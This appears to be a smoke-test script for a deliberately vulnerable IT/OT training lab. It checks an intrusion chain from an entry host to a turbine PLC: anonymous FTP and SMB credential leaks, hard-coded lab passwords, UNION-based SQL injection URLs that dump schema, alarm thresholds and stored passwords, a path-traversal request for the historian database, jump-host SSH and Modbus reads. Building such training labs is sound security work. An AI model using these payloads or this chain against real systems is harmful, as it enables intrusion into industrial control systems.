#!/usr/bin/env bash
# Walks through the full IT/OT chain from internet to turbine PLC. Assumes
# './ctl up' has been run.
#
# Coverage:
#   Stage 0  ssh rincewind/wizzard works on wizzards-retreat
#   Stage 1  hex-legacy-1 ports open, anonymous FTP serves credential leak,
#            SMB guest access works
#   Stage 2  ssh bursardesk/Octavo1 to bursar-desk works, ops-access.conf retrievable
#   Stage 3  /assets, SQL injection on /report, alarm_config and config tables,
#            /export path traversal serves historian.db
#   Stage 4  ssh engineer/spanner99 to eng-ws works, plc-access.conf readable
#   Stage 5  modbus reads from turbine PLC return live values
#
# All probes that need to run from inside the enterprise zone use
# wizzards-retreat (admin-home) directly, since rincewind's machine has the
# recon tools the runbook tells the visitor to use. SSH login probes against
# enterprise/operational hosts use paramiko's chained transport from
# attacker-machine, mirroring 'ssh -J rincewind@10.10.0.10 ...'.
#
# Usage: bash tests/smoke/test_enterprise_to_turbine_trip.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="attacker-machine"
HOME_BOX="admin-home"
LEGACY="legacy-workstation"
ENT_WS="enterprise-workstation"
HISTORIAN="historian"
ENG_WS="engineering-workstation"

for c in "$ATTACKER" "$HOME_BOX" "$LEGACY" "$ENT_WS" "$HISTORIAN" "$ENG_WS" turbine_plc; do
    require_running "$c"
done

echo "[ent-to-trip] Waiting for services to come up..."
wait_for_port "$ATTACKER" 10.10.0.10 22 30 || fail "wizzards-retreat sshd not ready"
wait_for_port "$HOME_BOX"  10.10.1.10 21 30 || fail "hex-legacy-1 ftp not ready"
wait_for_port "$HOME_BOX"  10.10.1.20 22 30 || fail "bursar-desk sshd not ready"
wait_for_port "$ENT_WS"    10.10.2.10 8080 30 || fail "historian web not ready"

echo "[ent-to-trip] Stage 0a: SSH rincewind/wizzard"

LOGIN_OUT="$(ssh_password_login "$ATTACKER" rincewind 10.10.0.10 wizzard)"
assert_contains "$LOGIN_OUT" "SSH_OK" "ssh rincewind/wizzard authenticates"

echo "[ent-to-trip] Stage 0b: HTTP status endpoint (admin:admin recon path)"

# The runbook lists 'curl -u admin:admin http://10.10.0.10/status' as Path B,
# a recon-only entry that confirms admin-home is alive without compromising it.
STATUS_OUT="$(in_container "$ATTACKER" curl -sf -u admin:admin -m 5 http://10.10.0.10/status 2>&1)"
assert_contains "$STATUS_OUT" "hostname: admin-home" "/status returns admin-home identity"
assert_contains "$STATUS_OUT" "vpn_status" "/status exposes vpn_status field"

echo "[ent-to-trip] Stage 1a: hex-legacy-1 service ports open"

NMAP_LEGACY="$(in_container "$HOME_BOX" nmap -p 21,22,23,139,445 10.10.1.10 2>&1)"
assert_contains "$NMAP_LEGACY" "21/tcp +open"  "hex-legacy-1 21/tcp open (FTP)"
assert_contains "$NMAP_LEGACY" "22/tcp +open"  "hex-legacy-1 22/tcp open (SSH)"
assert_contains "$NMAP_LEGACY" "23/tcp +open"  "hex-legacy-1 23/tcp open (Telnet)"
assert_contains "$NMAP_LEGACY" "139/tcp +open" "hex-legacy-1 139/tcp open (SMB)"
assert_contains "$NMAP_LEGACY" "445/tcp +open" "hex-legacy-1 445/tcp open (SMB)"

echo "[ent-to-trip] Stage 1b: anonymous FTP exposes credential-bearing files"

FTP_DUMP="$(in_container "$HOME_BOX" sh -c '
mkdir -p /tmp/ftp && cd /tmp/ftp
ftp -n -v 10.10.1.10 <<EOF >/dev/null 2>&1
user anonymous anon@x
binary
prompt off
cd LOGBOOK
get ENGINEER.LOG
cd ../UUPL
get NETWORK.TXT
quit
EOF
echo "==== ENGINEER.LOG ===="
cat ENGINEER.LOG 2>/dev/null || echo "(missing)"
echo "==== NETWORK.TXT ===="
cat NETWORK.TXT 2>/dev/null || echo "(missing)"
rm -rf /tmp/ftp
')"
assert_contains "$FTP_DUMP" "spanner99"     "anonymous FTP leaks engineer/spanner99"
assert_contains "$FTP_DUMP" "Octavo1"       "anonymous FTP leaks bursardesk/Octavo1"
assert_contains "$FTP_DUMP" "Historian2015" "anonymous FTP leaks Historian2015"
assert_contains "$FTP_DUMP" "10\.10\.2\.30" "NETWORK.TXT names eng-ws (10.10.2.30)"

echo "[ent-to-trip] Stage 1c: SMB guest read on //10.10.1.10/public"

# legacy-workstation serves SMB1 (NT1) which modern smbclient refuses by
# default. Pass the protocol option through sh -c so the embedded space
# survives docker exec arg-splitting. The flag itself is realistic OT
# pentest knowledge: the runbook needs to mention it for visitors using a
# current Samba client.
SMB_LIST="$(in_container "$HOME_BOX" sh -c "smbclient -N -L //10.10.1.10 --option='client min protocol=NT1' 2>&1")"
assert_contains "$SMB_LIST" "public" "SMB lists 'public' share"

SMB_LS="$(in_container "$HOME_BOX" sh -c "smbclient -N //10.10.1.10/public --option='client min protocol=NT1' -c 'ls' 2>&1")"
assert_contains "$SMB_LS" "LOGBOOK|UUPL" "SMB public share contains LOGBOOK or UUPL directory"

echo "[ent-to-trip] Stage 2: SSH bursardesk/Octavo1 via wizzards-retreat jump"

BURSAR_LOGIN="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    bursardesk 10.10.1.20 Octavo1)"
assert_contains "$BURSAR_LOGIN" "SSH_OK" "ssh bursardesk/Octavo1 authenticates via jump"

# Visitor experience: facade honours -c so `ssh ... whoami` returns the
# Windows-style identity instead of the banner.
BURSAR_WHOAMI="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    bursardesk 10.10.1.20 Octavo1 \
    'whoami')"
assert_contains "$BURSAR_WHOAMI" "bursardesk" "bursar-desk facade -c whoami returns identity"

# And `ssh ... cat <path>` returns the file content. This is what a visitor
# would do straight from the SSH command line per the runbook.
BURSAR_CAT="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    bursardesk 10.10.1.20 Octavo1 \
    'cat AppData/Roaming/UUPLOps/ops-access.conf')"
assert_contains "$BURSAR_CAT" "Historian2015" "bursar-desk facade -c cat returns file content"

OPS_CONF="$(in_container "$ENT_WS" cat /opt/win10/C/Users/bursardesk/AppData/Roaming/UUPLOps/ops-access.conf 2>&1)"
assert_contains "$OPS_CONF" "Historian2015" "ops-access.conf contains historian password"
assert_contains "$OPS_CONF" "10\.10\.2\.10" "ops-access.conf names historian host"

# Alternate credential discovery path the runbook calls out: PowerShell history
# at AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# is meant to expose the same credentials in a different shape.
PS_HISTORY="$(in_container "$ENT_WS" cat "/opt/win10/C/Users/bursardesk/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt" 2>&1)"
assert_contains "$PS_HISTORY" "10\.10\.2\.10|historian|Historian2015" \
    "PowerShell history leaks historian credentials"

echo "[ent-to-trip] Stage 3a: historian /assets endpoint"

ASSETS="$(in_container "$ENT_WS" curl -sf http://10.10.2.10:8080/assets 2>&1)"
assert_contains "$ASSETS" "turbine_main|turbine_rpm" "historian /assets returns a turbine asset"

echo "[ent-to-trip] Stage 3a': SQL injection enumerates sqlite_master schema"

# Runbook's first SQLi step lists the DB schema before targeting specific tables.
SCHEMA_SQLI_URL="http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+name,sql,'x'+FROM+sqlite_master--&from=0&to=9"
SCHEMA_OUT="$(in_container "$ENT_WS" curl -sf "$SCHEMA_SQLI_URL" 2>&1)"
assert_contains "$SCHEMA_OUT" "readings"     "sqlite_master SQLi reveals readings table"
assert_contains "$SCHEMA_OUT" "alarm_config" "sqlite_master SQLi reveals alarm_config table"
assert_contains "$SCHEMA_OUT" "config"       "sqlite_master SQLi reveals config table"

echo "[ent-to-trip] Stage 3b: SQL injection enumerates alarm_config"

ALARM_SQLI_URL="http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+tag,hi_hi,unit+FROM+alarm_config--&from=0&to=9"
ALARM_OUT="$(in_container "$ENT_WS" curl -sf "$ALARM_SQLI_URL" 2>&1)"
assert_contains "$ALARM_OUT" "turbine_rpm.*3300" "SQLi reveals overspeed threshold (3300 RPM)"
assert_contains "$ALARM_OUT" "line_current_a.*200|relay_a_oc.*150" \
    "SQLi reveals overcurrent threshold for feeder A"

echo "[ent-to-trip] Stage 3c: SQL injection enumerates config table"

CONFIG_SQLI_URL="http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
CONFIG_OUT="$(in_container "$ENT_WS" curl -sf "$CONFIG_SQLI_URL" 2>&1)"
assert_contains "$CONFIG_OUT" "Historian2015" "SQLi recovers stored password"

echo "[ent-to-trip] Stage 3d: path traversal /export?tag=../historian.db"

# Bash command substitution strips null bytes, so reading the SQLite header
# (which contains nulls) directly into a $(...) capture would corrupt it.
# Use python to peek the magic bytes inside the container and emit a clean
# textual verdict.
TRAV_OUT="$(in_container "$ENT_WS" sh -c '
curl -sf "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/h.db
python3 -c "
import sys
with open(\"/tmp/h.db\",\"rb\") as f:
    head = f.read(16)
print(\"MAGIC=SQLite\" if head.startswith(b\"SQLite format 3\") else \"MAGIC=OTHER:\"+repr(head))
"
rm -f /tmp/h.db
')"
assert_contains "$TRAV_OUT" "MAGIC=SQLite" "path traversal serves the SQLite database file"

echo "[ent-to-trip] Stage 3e: SSH hist_admin via jump, facade -c works"

# The runbook reuses Historian2015 from /config as the SSH password. Verify
# auth works AND the facade returns the historian whoami output rather than
# the banner.
HIST_LOGIN="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    hist_admin 10.10.2.10 Historian2015)"
assert_contains "$HIST_LOGIN" "SSH_OK" "ssh hist_admin/Historian2015 authenticates via jump"

HIST_WHOAMI="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    hist_admin 10.10.2.10 Historian2015 \
    'whoami')"
assert_contains "$HIST_WHOAMI" "hist_admin" "historian facade -c whoami returns identity"

echo "[ent-to-trip] Stage 4: SSH engineer/spanner99 via wizzards-retreat jump"

ENG_LOGIN="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    engineer 10.10.2.30 spanner99)"
assert_contains "$ENG_LOGIN" "SSH_OK" "ssh engineer/spanner99 authenticates via jump"

# Visitor experience: ssh engineer@... 'cat plc-access.conf' returns content,
# not banner. The runbook's `type config\plc-access.conf` step works directly
# from the SSH command line now that the facade honours -c.
ENG_CAT="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    engineer 10.10.2.30 spanner99 \
    'cat config/plc-access.conf')"
assert_contains "$ENG_CAT" "10\.10\.3\.21" "eng-ws facade -c cat returns plc-access.conf content"

WIN_PROFILE="/opt/win10/C/Users/engineer"
PLC_CONF="$(in_container "$ENG_WS" cat "$WIN_PROFILE/config/plc-access.conf" 2>&1)"
assert_contains "$PLC_CONF" "10\.10\.3\.21" "plc-access.conf lists turbine PLC"

echo "[ent-to-trip] Stage 5: turbine PLC modbus reads"

INPUT_OUT="$(in_container "$ENG_WS" /venv/bin/python3 "$WIN_PROFILE/Tools/modbus_read.py" 10.10.3.21 502 input 0 11 2>&1)"
assert_contains "$INPUT_OUT" "\[[0-9]" "modbus_read input 0:11 returns list"

HOLD_OUT="$(in_container "$ENG_WS" /venv/bin/python3 "$WIN_PROFILE/Tools/modbus_read.py" 10.10.3.21 502 holding 0 4 2>&1)"
assert_contains "$HOLD_OUT" "\[[0-9]" "modbus_read holding 0:4 returns list"

COIL_OUT="$(in_container "$ENG_WS" /venv/bin/python3 "$WIN_PROFILE/Tools/modbus_read.py" 10.10.3.21 502 coil 0 1 2>&1)"
assert_contains "$COIL_OUT" "\[(False|True)" "modbus_read coil 0:1 returns boolean"

summary